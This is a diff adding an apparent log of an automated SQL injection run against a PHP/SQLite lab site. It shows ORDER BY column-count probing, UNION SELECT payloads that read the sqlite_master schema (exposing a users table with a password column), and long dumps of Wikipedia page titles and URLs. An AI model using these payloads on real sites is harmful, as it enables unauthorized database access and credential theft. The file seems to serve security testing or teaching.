@@ -1,0 +1,1190 @@
+< ERROR comment:# >
+QUERY: ' ORDER BY 1#
+QUERY: ' ORDER BY 2#
+QUERY: ' ORDER BY 3#
+QUERY: ' ORDER BY 4#
+QUERY: ' ORDER BY 5#
+QUERY: ' ORDER BY 6#
+QUERY: ' ORDER BY 7#
+QUERY: ' ORDER BY 8#
+QUERY: ' ORDER BY 9#
+QUERY: ' ORDER BY 10#
+QUERY: ' ORDER BY 11#
+< ERROR comment:-- >
+QUERY: ' ORDER BY 1--
+QUERY: ' ORDER BY 2--
+QUERY: ' ORDER BY 3--
+QUERY: ' ORDER BY 4--
+column counts: 3
+< UNION comment:-- >
+mode: SQLite
+QUERY: ' UNION SELECT null, null, sql FROM sqlite_schema--
+
+Fatal error:  Uncaught Error: Call to a member function fetch() on boolean in /var/www/html/index.php:111
+Stack trace:
+#0 {main}
+thrown in /var/www/html/index.php on line 111
+
+QUERY: ' UNION SELECT null, null, tbl_name FROM sqlite_master--
+
+pages
+sqlite_sequence
+users
+Wikipedia - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia
+Free content - Wikipedia
+http://en.wikipedia.org/wiki/Free_content
+Encyclopedia - Wikipedia
+http://en.wikipedia.org/wiki/Encyclopedia
+Wikipedia:Introduction - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Introduction
+Statistics - Wikipedia
+http://en.wikipedia.org/wiki/Special:Statistics
+English language - Wikipedia
+http://en.wikipedia.org/wiki/English_language
+Portal:Arts - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Arts
+Portal:Biography - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Biography
+Portal:Geography - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Geography
+Portal:History - Wikipedia
+http://en.wikipedia.org/wiki/Portal:History
+Portal:Mathematics - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Mathematics
+Portal:Science - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Science
+Portal:Society - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Society
+Portal:Technology - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Technology
+Portal:Contents/Portals - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Contents/Portals
+File:Other Worlds - November 1949 (first issue).jpg - Wikipedia
+http://en.wikipedia.org/wiki/File:Other_Worlds_-_November_1949_(first_issue).jpg
+Other Worlds, Universe Science Fiction, and Science Stories - Wikipedia
+http://en.wikipedia.org/wiki/Other_Worlds,_Universe_Science_Fiction,_and_Science_Stories
+Raymond A. Palmer - Wikipedia
+http://en.wikipedia.org/wiki/Raymond_A._Palmer
+A. E. van Vogt - Wikipedia
+http://en.wikipedia.org/wiki/A._E._van_Vogt
+Ray Bradbury - Wikipedia
+http://en.wikipedia.org/wiki/Ray_Bradbury
+The Martian Chronicles - Wikipedia
+http://en.wikipedia.org/wiki/The_Martian_Chronicles
+Theodore Sturgeon - Wikipedia
+http://en.wikipedia.org/wiki/Theodore_Sturgeon
+The World Well Lost - Wikipedia
+http://en.wikipedia.org/wiki/The_World_Well_Lost
+Marion Zimmer Bradley - Wikipedia
+http://en.wikipedia.org/wiki/Marion_Zimmer_Bradley
+Unidentified flying object - Wikipedia
+http://en.wikipedia.org/wiki/Unidentified_flying_object
+Other Worlds, Universe Science Fiction, and Science Stories - Wikipedia
+http://en.wikipedia.org/wiki/Other_Worlds,_Universe_Science_Fiction,_and_Science_Stories
+Jean Baptiste Point du Sable - Wikipedia
+http://en.wikipedia.org/wiki/Jean_Baptiste_Point_du_Sable
+RSPB Minsmere - Wikipedia
+http://en.wikipedia.org/wiki/RSPB_Minsmere
+Kalākaua coinage - Wikipedia
+http://en.wikipedia.org/wiki/Kal%C4%81kaua_coinage
+Wikipedia:Featured articles - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Featured_articles
+Arthur Streeton - Wikipedia
+http://en.wikipedia.org/wiki/Arthur_Streeton
+Exhibition of Australian Art in London - Wikipedia
+http://en.wikipedia.org/wiki/Exhibition_of_Australian_Art_in_London
+Toshio Hosokawa - Wikipedia
+http://en.wikipedia.org/wiki/Toshio_Hosokawa
+Noh - Wikipedia
+http://en.wikipedia.org/wiki/Noh
+Vision of Lear - Wikipedia
+http://en.wikipedia.org/wiki/Vision_of_Lear
+Georg Cantor - Wikipedia
+http://en.wikipedia.org/wiki/Georg_Cantor
+Transcendental number - Wikipedia
+http://en.wikipedia.org/wiki/Transcendental_number
+Karel František Koch - Wikipedia
+http://en.wikipedia.org/wiki/Karel_Franti%C5%A1ek_Koch
+Armin Frieder - Wikipedia
+http://en.wikipedia.org/wiki/Armin_Frieder
+The Holocaust - Wikipedia
+http://en.wikipedia.org/wiki/The_Holocaust
+Washington State Route 504 - Wikipedia
+http://en.wikipedia.org/wiki/Washington_State_Route_504
+Lahar - Wikipedia
+http://en.wikipedia.org/wiki/Lahar
+1980 eruption of Mount St. Helens - Wikipedia
+http://en.wikipedia.org/wiki/1980_eruption_of_Mount_St._Helens
+Wang Enduo - Wikipedia
+http://en.wikipedia.org/wiki/Wang_Enduo
+Chinese Academy of Sciences - Wikipedia
+http://en.wikipedia.org/wiki/Chinese_Academy_of_Sciences
+The World Academy of Sciences - Wikipedia
+http://en.wikipedia.org/wiki/The_World_Academy_of_Sciences
+Herbert Maryon - Wikipedia
+http://en.wikipedia.org/wiki/Herbert_Maryon
+Kirkhaugh cairns - Wikipedia
+http://en.wikipedia.org/wiki/Kirkhaugh_cairns
+Tracy LaQuey Parker - Wikipedia
+http://en.wikipedia.org/wiki/Tracy_LaQuey_Parker
+Email spoofing - Wikipedia
+http://en.wikipedia.org/wiki/Email_spoofing
+Wikipedia:Recent additions - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Recent_additions
+Wikipedia:Your first article - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Your_first_article
+Template talk:Did you know - Wikipedia
+http://en.wikipedia.org/wiki/Template_talk:Did_you_know
+File:Asteroid-Bennu-OSIRIS-RExArrival-GifAnimation-20181203.gif - Wikipedia
+http://en.wikipedia.org/wiki/File:Asteroid-Bennu-OSIRIS-RExArrival-GifAnimation-20181203.gif
+Sample-return mission - Wikipedia
+http://en.wikipedia.org/wiki/Sample-return_mission
+OSIRIS-REx - Wikipedia
+http://en.wikipedia.org/wiki/OSIRIS-REx
+101955 Bennu - Wikipedia
+http://en.wikipedia.org/wiki/101955_Bennu
+President of the United States - Wikipedia
+http://en.wikipedia.org/wiki/President_of_the_United_States
+George H. W. Bush - Wikipedia
+http://en.wikipedia.org/wiki/George_H._W._Bush
+Death and state funeral of George H. W. Bush - Wikipedia
+http://en.wikipedia.org/wiki/Death_and_state_funeral_of_George_H._W._Bush
+Magnus Carlsen - Wikipedia
+http://en.wikipedia.org/wiki/Magnus_Carlsen
+Fabiano Caruana - Wikipedia
+http://en.wikipedia.org/wiki/Fabiano_Caruana
+World Chess Championship 2018 - Wikipedia
+http://en.wikipedia.org/wiki/World_Chess_Championship_2018
+NASA - Wikipedia
+http://en.wikipedia.org/wiki/NASA
+InSight - Wikipedia
+http://en.wikipedia.org/wiki/InSight
+Mars - Wikipedia
+http://en.wikipedia.org/wiki/Mars
+Petro Poroshenko - Wikipedia
+http://en.wikipedia.org/wiki/Petro_Poroshenko
+Martial law - Wikipedia
+http://en.wikipedia.org/wiki/Martial_law
+Kerch Strait incident - Wikipedia
+http://en.wikipedia.org/wiki/Kerch_Strait_incident
+Kerch Strait - Wikipedia
+http://en.wikipedia.org/wiki/Kerch_Strait
+Crimea - Wikipedia
+http://en.wikipedia.org/wiki/Crimea
+Portal:Current events - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Current_events
+Yellow vests movement - Wikipedia
+http://en.wikipedia.org/wiki/Yellow_vests_movement
+Deaths in 2018 - Wikipedia
+http://en.wikipedia.org/wiki/Deaths_in_2018
+Nika Rurua - Wikipedia
+http://en.wikipedia.org/wiki/Nika_Rurua
+Selma Engel-Wijnberg - Wikipedia
+http://en.wikipedia.org/wiki/Selma_Engel-Wijnberg
+Kim Chol-man - Wikipedia
+http://en.wikipedia.org/wiki/Kim_Chol-man
+Scott Stearney - Wikipedia
+http://en.wikipedia.org/wiki/Scott_Stearney
+Wikipedia:In the news/Candidates - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:In_the_news/Candidates
+December 7 - Wikipedia
+http://en.wikipedia.org/wiki/December_7
+Armed Forces Flag Day - Wikipedia
+http://en.wikipedia.org/wiki/Armed_Forces_Flag_Day
+National Pearl Harbor Remembrance Day - Wikipedia
+http://en.wikipedia.org/wiki/National_Pearl_Harbor_Remembrance_Day
+File:HMS Spiteful under way.jpg - Wikipedia
+http://en.wikipedia.org/wiki/File:HMS_Spiteful_under_way.jpg
+43 BC - Wikipedia
+http://en.wikipedia.org/wiki/43_BC
+Cicero - Wikipedia
+http://en.wikipedia.org/wiki/Cicero
+Ancient Rome - Wikipedia
+http://en.wikipedia.org/wiki/Ancient_Rome
+Rhetoric - Wikipedia
+http://en.wikipedia.org/wiki/Rhetoric
+Proscription - Wikipedia
+http://en.wikipedia.org/wiki/Proscription
+Enemy of the state - Wikipedia
+http://en.wikipedia.org/wiki/Enemy_of_the_state
+1904 - Wikipedia
+http://en.wikipedia.org/wiki/1904
+HMS Spiteful (1899) - Wikipedia
+http://en.wikipedia.org/wiki/HMS_Spiteful_(1899)
+Warship - Wikipedia
+http://en.wikipedia.org/wiki/Warship
+Fuel oil - Wikipedia
+http://en.wikipedia.org/wiki/Fuel_oil
+Royal Navy - Wikipedia
+http://en.wikipedia.org/wiki/Royal_Navy
+1936 - Wikipedia
+http://en.wikipedia.org/wiki/1936
+Cricket - Wikipedia
+http://en.wikipedia.org/wiki/Cricket
+Jack Fingleton - Wikipedia
+http://en.wikipedia.org/wiki/Jack_Fingleton
+Century (cricket) - Wikipedia
+http://en.wikipedia.org/wiki/Century_(cricket)
+Test cricket - Wikipedia
+http://en.wikipedia.org/wiki/Test_cricket
+1988 - Wikipedia
+http://en.wikipedia.org/wiki/1988
+Surface wave magnitude - Wikipedia
+http://en.wikipedia.org/wiki/Surface_wave_magnitude
+1988 Armenian earthquake - Wikipedia
+http://en.wikipedia.org/wiki/1988_Armenian_earthquake
+Spitak - Wikipedia
+http://en.wikipedia.org/wiki/Spitak
+1993 - Wikipedia
+http://en.wikipedia.org/wiki/1993
+1993 Long Island Rail Road shooting - Wikipedia
+http://en.wikipedia.org/wiki/1993_Long_Island_Rail_Road_shooting
+Long Island Rail Road - Wikipedia
+http://en.wikipedia.org/wiki/Long_Island_Rail_Road
+Garden City, New York - Wikipedia
+http://en.wikipedia.org/wiki/Garden_City,_New_York
+Richard Bellingham - Wikipedia
+http://en.wikipedia.org/wiki/Richard_Bellingham
+Hamilton Fish III - Wikipedia
+http://en.wikipedia.org/wiki/Hamilton_Fish_III
+Barbara Howard (artist) - Wikipedia
+http://en.wikipedia.org/wiki/Barbara_Howard_(artist)
+December 6 - Wikipedia
+http://en.wikipedia.org/wiki/December_6
+December 7 - Wikipedia
+http://en.wikipedia.org/wiki/December_7
+December 8 - Wikipedia
+http://en.wikipedia.org/wiki/December_8
+Wikipedia:Selected anniversaries/December - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Selected_anniversaries/December
+List of historical anniversaries - Wikipedia
+http://en.wikipedia.org/wiki/List_of_historical_anniversaries
+File:150426 Meghan Trainor.jpg - Wikipedia
+http://en.wikipedia.org/wiki/File:150426_Meghan_Trainor.jpg
+List of awards and nominations received by Meghan Trainor - Wikipedia
+http://en.wikipedia.org/wiki/List_of_awards_and_nominations_received_by_Meghan_Trainor
+Epic Records - Wikipedia
+http://en.wikipedia.org/wiki/Epic_Records
+All About That Bass - Wikipedia
+http://en.wikipedia.org/wiki/All_About_That_Bass
+Grammy Award - Wikipedia
+http://en.wikipedia.org/wiki/Grammy_Award
+Grammy Award for Record of the Year - Wikipedia
+http://en.wikipedia.org/wiki/Grammy_Award_for_Record_of_the_Year
+Grammy Award for Song of the Year - Wikipedia
+http://en.wikipedia.org/wiki/Grammy_Award_for_Song_of_the_Year
+American Society of Composers, Authors and Publishers - Wikipedia
+http://en.wikipedia.org/wiki/ASCAP_Pop_Music_Award
+Billboard Music Award - Wikipedia
+http://en.wikipedia.org/wiki/Billboard_Music_Award
+Billboard Music Award for Top Hot 100 Song - Wikipedia
+http://en.wikipedia.org/wiki/Billboard_Music_Award_for_Top_Hot_100_Song
+Meghan Trainor - Wikipedia
+http://en.wikipedia.org/wiki/Meghan_Trainor
+Lips Are Movin - Wikipedia
+http://en.wikipedia.org/wiki/Lips_Are_Movin
+Teen Choice Award for Choice Music – Break-Up Song - Wikipedia
+http://en.wikipedia.org/wiki/Teen_Choice_Award_for_Choice_Music_%E2%80%93_Break-Up_Song
+Teen Choice Awards - Wikipedia
+http://en.wikipedia.org/wiki/Teen_Choice_Awards
+Title (Meghan Trainor album) - Wikipedia
+http://en.wikipedia.org/wiki/Title_(Meghan_Trainor_album)
+Grammy Award for Best New Artist - Wikipedia
+http://en.wikipedia.org/wiki/Grammy_Award_for_Best_New_Artist
+Brit Award for International Female Solo Artist - Wikipedia
+http://en.wikipedia.org/wiki/Brit_Award_for_International_Female_Solo_Artist
+Hollywood Music in Media Awards - Wikipedia
+http://en.wikipedia.org/wiki/Hollywood_Music_in_Media_Awards
+Thank You (Meghan Trainor album) - Wikipedia
+http://en.wikipedia.org/wiki/Thank_You_(Meghan_Trainor_album)
+No (Meghan Trainor song) - Wikipedia
+http://en.wikipedia.org/wiki/No_(Meghan_Trainor_song)
+List of awards and nominations received by Meghan Trainor - Wikipedia
+http://en.wikipedia.org/wiki/List_of_awards_and_nominations_received_by_Meghan_Trainor
+List of works by H. Rider Haggard - Wikipedia
+http://en.wikipedia.org/wiki/List_of_works_by_H._Rider_Haggard
+List of Davis Cup champions - Wikipedia
+http://en.wikipedia.org/wiki/List_of_Davis_Cup_champions
+Daytime Emmy Award for Outstanding Drama Series Directing Team - Wikipedia
+http://en.wikipedia.org/wiki/Daytime_Emmy_Award_for_Outstanding_Drama_Series_Directing_Team
+Wikipedia:Featured lists - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Featured_lists
+Camelopardalis - Wikipedia
+http://en.wikipedia.org/wiki/Camelopardalis
+Constellation - Wikipedia
+http://en.wikipedia.org/wiki/Constellation
+Celestial sphere - Wikipedia
+http://en.wikipedia.org/wiki/Celestial_sphere
+Petrus Plancius - Wikipedia
+http://en.wikipedia.org/wiki/Petrus_Plancius
+Beta Camelopardalis - Wikipedia
+http://en.wikipedia.org/wiki/Beta_Camelopardalis
+CS Camelopardalis - Wikipedia
+http://en.wikipedia.org/wiki/CS_Camelopardalis
+Variable star - Wikipedia
+http://en.wikipedia.org/wiki/Variable_star
+Alpha Camelopardalis - Wikipedia
+http://en.wikipedia.org/wiki/Alpha_Camelopardalis
+Galactic plane - Wikipedia
+http://en.wikipedia.org/wiki/Galactic_plane
+NGC 2403 - Wikipedia
+http://en.wikipedia.org/wiki/NGC_2403
+M81 Group - Wikipedia
+http://en.wikipedia.org/wiki/M81_Group
+Rangifer (constellation) - Wikipedia
+http://en.wikipedia.org/wiki/Rangifer_(constellation)
+Custos Messium - Wikipedia
+http://en.wikipedia.org/wiki/Custos_Messium
+Sidney Hall - Wikipedia
+http://en.wikipedia.org/wiki/Sidney_Hall
+User:Adam Cuerden - Wikipedia
+http://en.wikipedia.org/wiki/User:Adam_Cuerden
+Template:POTD/2018-12-06 - Wikipedia
+http://en.wikipedia.org/wiki/Template:POTD/2018-12-06
+Template:POTD/2018-12-05 - Wikipedia
+http://en.wikipedia.org/wiki/Template:POTD/2018-12-05
+Template:POTD/2018-12-04 - Wikipedia
+http://en.wikipedia.org/wiki/Template:POTD/2018-12-04
+Wikipedia:Picture of the day/December 2018 - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Picture_of_the_day/December_2018
+Wikipedia:Featured pictures - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Featured_pictures
+Wikipedia:Community portal - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Community_portal
+Wikipedia:Help desk - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Help_desk
+Wikipedia:Local Embassy - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Local_Embassy
+Wikipedia:Reference desk - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Reference_desk
+Wikipedia:News - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:News
+Wikipedia:Village pump - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Village_pump
+Wikimedia Foundation - Wikipedia
+http://en.wikipedia.org/wiki/Wikimedia_Foundation
+English language - Wikipedia
+http://en.wikipedia.org/wiki/English_language
+Statistics - Wikipedia
+http://en.wikipedia.org/wiki/Special:Statistics
+User talk:193.190.204.60 - Wikipedia
+http://en.wikipedia.org/wiki/Special:MyTalk
+User contributions for 193.190.204.60 - Wikipedia
+http://en.wikipedia.org/wiki/Special:MyContributions
+Wikipedia, the free encyclopedia
+http://en.wikipedia.org/wiki/Main_Page
+Talk:Main Page - Wikipedia
+http://en.wikipedia.org/wiki/Talk:Main_Page
+Wikipedia, the free encyclopedia
+http://en.wikipedia.org/wiki/Main_Page
+Wikipedia, the free encyclopedia
+http://en.wikipedia.org/wiki/Main_Page
+Wikipedia, the free encyclopedia
+http://en.wikipedia.org/wiki/Main_Page
+Portal:Contents - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Contents
+Portal:Featured content - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Featured_content
+Portal:Current events - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Current_events
+The Three Graces (sculpture) - Wikipedia
+http://en.wikipedia.org/wiki/Special:Random
+Help:Contents - Wikipedia
+http://en.wikipedia.org/wiki/Help:Contents
+Wikipedia:About - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:About
+Wikipedia:Community portal - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Community_portal
+Recent changes - Wikipedia
+http://en.wikipedia.org/wiki/Special:RecentChanges
+Related changes - Wikipedia
+http://en.wikipedia.org/wiki/Special:RecentChangesLinked/Main_Page
+Wikipedia:File Upload Wizard - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:File_Upload_Wizard
+Special pages - Wikipedia
+http://en.wikipedia.org/wiki/Special:SpecialPages
+Wikipedia:About - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:About
+Wikipedia:General disclaimer - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:General_disclaimer
+Cylab
+https://cylab.be
+		
+
+QUERY: ' UNION SELECT null, null, sql FROM sqlite_master--
+
+CREATE TABLE pages (page_id  INTEGER PRIMARY KEY AUTOINCREMENT, title VARCHAR(50), url text)
+CREATE TABLE sqlite_sequence(name,seq)
+CREATE TABLE users (user_id INTEGER PRIMARY KEY AUTOINCREMENT, username VARCHAR(20) UNIQUE, password VARCHAR(32))
+Wikipedia - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia
+Free content - Wikipedia
+http://en.wikipedia.org/wiki/Free_content
+Encyclopedia - Wikipedia
+http://en.wikipedia.org/wiki/Encyclopedia
+Wikipedia:Introduction - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Introduction
+Statistics - Wikipedia
+http://en.wikipedia.org/wiki/Special:Statistics
+English language - Wikipedia
+http://en.wikipedia.org/wiki/English_language
+Portal:Arts - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Arts
+Portal:Biography - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Biography
+Portal:Geography - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Geography
+Portal:History - Wikipedia
+http://en.wikipedia.org/wiki/Portal:History
+Portal:Mathematics - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Mathematics
+Portal:Science - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Science
+Portal:Society - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Society
+Portal:Technology - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Technology
+Portal:Contents/Portals - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Contents/Portals
+File:Other Worlds - November 1949 (first issue).jpg - Wikipedia
+http://en.wikipedia.org/wiki/File:Other_Worlds_-_November_1949_(first_issue).jpg
+Other Worlds, Universe Science Fiction, and Science Stories - Wikipedia
+http://en.wikipedia.org/wiki/Other_Worlds,_Universe_Science_Fiction,_and_Science_Stories
+Raymond A. Palmer - Wikipedia
+http://en.wikipedia.org/wiki/Raymond_A._Palmer
+A. E. van Vogt - Wikipedia
+http://en.wikipedia.org/wiki/A._E._van_Vogt
+Ray Bradbury - Wikipedia
+http://en.wikipedia.org/wiki/Ray_Bradbury
+The Martian Chronicles - Wikipedia
+http://en.wikipedia.org/wiki/The_Martian_Chronicles
+Theodore Sturgeon - Wikipedia
+http://en.wikipedia.org/wiki/Theodore_Sturgeon
+The World Well Lost - Wikipedia
+http://en.wikipedia.org/wiki/The_World_Well_Lost
+Marion Zimmer Bradley - Wikipedia
+http://en.wikipedia.org/wiki/Marion_Zimmer_Bradley
+Unidentified flying object - Wikipedia
+http://en.wikipedia.org/wiki/Unidentified_flying_object
+Other Worlds, Universe Science Fiction, and Science Stories - Wikipedia
+http://en.wikipedia.org/wiki/Other_Worlds,_Universe_Science_Fiction,_and_Science_Stories
+Jean Baptiste Point du Sable - Wikipedia
+http://en.wikipedia.org/wiki/Jean_Baptiste_Point_du_Sable
+RSPB Minsmere - Wikipedia
+http://en.wikipedia.org/wiki/RSPB_Minsmere
+Kalākaua coinage - Wikipedia
+http://en.wikipedia.org/wiki/Kal%C4%81kaua_coinage
+Wikipedia:Featured articles - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Featured_articles
+Arthur Streeton - Wikipedia
+http://en.wikipedia.org/wiki/Arthur_Streeton
+Exhibition of Australian Art in London - Wikipedia
+http://en.wikipedia.org/wiki/Exhibition_of_Australian_Art_in_London
+Toshio Hosokawa - Wikipedia
+http://en.wikipedia.org/wiki/Toshio_Hosokawa
+Noh - Wikipedia
+http://en.wikipedia.org/wiki/Noh
+Vision of Lear - Wikipedia
+http://en.wikipedia.org/wiki/Vision_of_Lear
+Georg Cantor - Wikipedia
+http://en.wikipedia.org/wiki/Georg_Cantor
+Transcendental number - Wikipedia
+http://en.wikipedia.org/wiki/Transcendental_number
+Karel František Koch - Wikipedia
+http://en.wikipedia.org/wiki/Karel_Franti%C5%A1ek_Koch
+Armin Frieder - Wikipedia
+http://en.wikipedia.org/wiki/Armin_Frieder
+The Holocaust - Wikipedia
+http://en.wikipedia.org/wiki/The_Holocaust
+Washington State Route 504 - Wikipedia
+http://en.wikipedia.org/wiki/Washington_State_Route_504
+Lahar - Wikipedia
+http://en.wikipedia.org/wiki/Lahar
+1980 eruption of Mount St. Helens - Wikipedia
+http://en.wikipedia.org/wiki/1980_eruption_of_Mount_St._Helens
+Wang Enduo - Wikipedia
+http://en.wikipedia.org/wiki/Wang_Enduo
+Chinese Academy of Sciences - Wikipedia
+http://en.wikipedia.org/wiki/Chinese_Academy_of_Sciences
+The World Academy of Sciences - Wikipedia
+http://en.wikipedia.org/wiki/The_World_Academy_of_Sciences
+Herbert Maryon - Wikipedia
+http://en.wikipedia.org/wiki/Herbert_Maryon
+Kirkhaugh cairns - Wikipedia
+http://en.wikipedia.org/wiki/Kirkhaugh_cairns
+Tracy LaQuey Parker - Wikipedia
+http://en.wikipedia.org/wiki/Tracy_LaQuey_Parker
+Email spoofing - Wikipedia
+http://en.wikipedia.org/wiki/Email_spoofing
+Wikipedia:Recent additions - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Recent_additions
+Wikipedia:Your first article - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Your_first_article
+Template talk:Did you know - Wikipedia
+http://en.wikipedia.org/wiki/Template_talk:Did_you_know
+File:Asteroid-Bennu-OSIRIS-RExArrival-GifAnimation-20181203.gif - Wikipedia
+http://en.wikipedia.org/wiki/File:Asteroid-Bennu-OSIRIS-RExArrival-GifAnimation-20181203.gif
+Sample-return mission - Wikipedia
+http://en.wikipedia.org/wiki/Sample-return_mission
+OSIRIS-REx - Wikipedia
+http://en.wikipedia.org/wiki/OSIRIS-REx
+101955 Bennu - Wikipedia
+http://en.wikipedia.org/wiki/101955_Bennu
+President of the United States - Wikipedia
+http://en.wikipedia.org/wiki/President_of_the_United_States
+George H. W. Bush - Wikipedia
+http://en.wikipedia.org/wiki/George_H._W._Bush
+Death and state funeral of George H. W. Bush - Wikipedia
+http://en.wikipedia.org/wiki/Death_and_state_funeral_of_George_H._W._Bush
+Magnus Carlsen - Wikipedia
+http://en.wikipedia.org/wiki/Magnus_Carlsen
+Fabiano Caruana - Wikipedia
+http://en.wikipedia.org/wiki/Fabiano_Caruana
+World Chess Championship 2018 - Wikipedia
+http://en.wikipedia.org/wiki/World_Chess_Championship_2018
+NASA - Wikipedia
+http://en.wikipedia.org/wiki/NASA
+InSight - Wikipedia
+http://en.wikipedia.org/wiki/InSight
+Mars - Wikipedia
+http://en.wikipedia.org/wiki/Mars
+Petro Poroshenko - Wikipedia
+http://en.wikipedia.org/wiki/Petro_Poroshenko
+Martial law - Wikipedia
+http://en.wikipedia.org/wiki/Martial_law
+Kerch Strait incident - Wikipedia
+http://en.wikipedia.org/wiki/Kerch_Strait_incident
+Kerch Strait - Wikipedia
+http://en.wikipedia.org/wiki/Kerch_Strait
+Crimea - Wikipedia
+http://en.wikipedia.org/wiki/Crimea
+Portal:Current events - Wikipedia
+http://en.wikipedia.org/wiki/Portal:Current_events
+Yellow vests movement - Wikipedia
+http://en.wikipedia.org/wiki/Yellow_vests_movement
+Deaths in 2018 - Wikipedia
+http://en.wikipedia.org/wiki/Deaths_in_2018
+Nika Rurua - Wikipedia
+http://en.wikipedia.org/wiki/Nika_Rurua
+Selma Engel-Wijnberg - Wikipedia
+http://en.wikipedia.org/wiki/Selma_Engel-Wijnberg
+Kim Chol-man - Wikipedia
+http://en.wikipedia.org/wiki/Kim_Chol-man
+Scott Stearney - Wikipedia
+http://en.wikipedia.org/wiki/Scott_Stearney
+Wikipedia:In the news/Candidates - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:In_the_news/Candidates
+December 7 - Wikipedia
+http://en.wikipedia.org/wiki/December_7
+Armed Forces Flag Day - Wikipedia
+http://en.wikipedia.org/wiki/Armed_Forces_Flag_Day
+National Pearl Harbor Remembrance Day - Wikipedia
+http://en.wikipedia.org/wiki/National_Pearl_Harbor_Remembrance_Day
+File:HMS Spiteful under way.jpg - Wikipedia
+http://en.wikipedia.org/wiki/File:HMS_Spiteful_under_way.jpg
+43 BC - Wikipedia
+http://en.wikipedia.org/wiki/43_BC
+Cicero - Wikipedia
+http://en.wikipedia.org/wiki/Cicero
+Ancient Rome - Wikipedia
+http://en.wikipedia.org/wiki/Ancient_Rome
+Rhetoric - Wikipedia
+http://en.wikipedia.org/wiki/Rhetoric
+Proscription - Wikipedia
+http://en.wikipedia.org/wiki/Proscription
+Enemy of the state - Wikipedia
+http://en.wikipedia.org/wiki/Enemy_of_the_state
+1904 - Wikipedia
+http://en.wikipedia.org/wiki/1904
+HMS Spiteful (1899) - Wikipedia
+http://en.wikipedia.org/wiki/HMS_Spiteful_(1899)
+Warship - Wikipedia
+http://en.wikipedia.org/wiki/Warship
+Fuel oil - Wikipedia
+http://en.wikipedia.org/wiki/Fuel_oil
+Royal Navy - Wikipedia
+http://en.wikipedia.org/wiki/Royal_Navy
+1936 - Wikipedia
+http://en.wikipedia.org/wiki/1936
+Cricket - Wikipedia
+http://en.wikipedia.org/wiki/Cricket
+Jack Fingleton - Wikipedia
+http://en.wikipedia.org/wiki/Jack_Fingleton
+Century (cricket) - Wikipedia
+http://en.wikipedia.org/wiki/Century_(cricket)
+Test cricket - Wikipedia
+http://en.wikipedia.org/wiki/Test_cricket
+1988 - Wikipedia
+http://en.wikipedia.org/wiki/1988
+Surface wave magnitude - Wikipedia
+http://en.wikipedia.org/wiki/Surface_wave_magnitude
+1988 Armenian earthquake - Wikipedia
+http://en.wikipedia.org/wiki/1988_Armenian_earthquake
+Spitak - Wikipedia
+http://en.wikipedia.org/wiki/Spitak
+1993 - Wikipedia
+http://en.wikipedia.org/wiki/1993
+1993 Long Island Rail Road shooting - Wikipedia
+http://en.wikipedia.org/wiki/1993_Long_Island_Rail_Road_shooting
+Long Island Rail Road - Wikipedia
+http://en.wikipedia.org/wiki/Long_Island_Rail_Road
+Garden City, New York - Wikipedia
+http://en.wikipedia.org/wiki/Garden_City,_New_York
+Richard Bellingham - Wikipedia
+http://en.wikipedia.org/wiki/Richard_Bellingham
+Hamilton Fish III - Wikipedia
+http://en.wikipedia.org/wiki/Hamilton_Fish_III
+Barbara Howard (artist) - Wikipedia
+http://en.wikipedia.org/wiki/Barbara_Howard_(artist)
+December 6 - Wikipedia
+http://en.wikipedia.org/wiki/December_6
+December 7 - Wikipedia
+http://en.wikipedia.org/wiki/December_7
+December 8 - Wikipedia
+http://en.wikipedia.org/wiki/December_8
+Wikipedia:Selected anniversaries/December - Wikipedia
+http://en.wikipedia.org/wiki/Wikipedia:Selected_anniversaries/December
+List of historical anniversaries - Wikipedia
+http://en.wikipedia.org/wiki/List_of_historical_anniversaries
+File:150426 Meghan Trainor.jpg - Wikipedia
+http://en.wikipedia.org/wiki/File:150426_Meghan_Trainor.jpg
+List of awards and nominations received by Meghan Trainor - Wikipedia
+http://en.wikipedia.org/wiki/List_of_awards_and_nominations_received_by_Meghan_Trainor
+Epic Records - Wikipedia
